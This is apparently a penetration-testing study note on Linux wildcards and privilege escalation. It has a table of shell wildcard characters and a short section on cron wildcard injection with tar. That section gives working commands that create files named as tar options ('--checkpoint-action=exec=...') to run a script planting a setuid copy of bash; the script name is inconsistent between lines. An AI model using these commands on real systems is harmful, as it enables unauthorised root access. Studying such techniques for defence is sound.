A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|
#### Cron Wildcards
If we only have read permissions on a script but it is using a wildcard with another command, we can make that command run something malicious instead
![[Pasted image 20250213155415.png]]
With tar specifically we can make it run a script using touch and checkpoints

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > privme.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh privmeme.sh"
```
#### Sudo -l

![](https://oscp.adot8.com/~gitbook/image?url=https%3A%2F%2F3007503158-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fp6nDpW0GBTPP8pZM4JHQ%252Fuploads%252FTppViBv9YZglOBRH4HuE%252Fimage.png%3Falt%3Dmedia%26token%3D703b1206-6e03-426f-bafa-087a5635d05c&width=768&dpr=4&quality=100&sign=a2eab99&sv=2)

With the wildcard we can just change the directory

![](https://oscp.adot8.com/~gitbook/image?url=https%3A%2F%2F3007503158-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fp6nDpW0GBTPP8pZM4JHQ%252Fuploads%252FgDl7bGpwWl3dDCC69ITB%252Fimage.png%3Falt%3Dmedia%26token%3D678dc55e-d02d-42e4-a5da-4de3673bc24f&width=768&dpr=4&quality=100&sign=56f5a936&sv=2)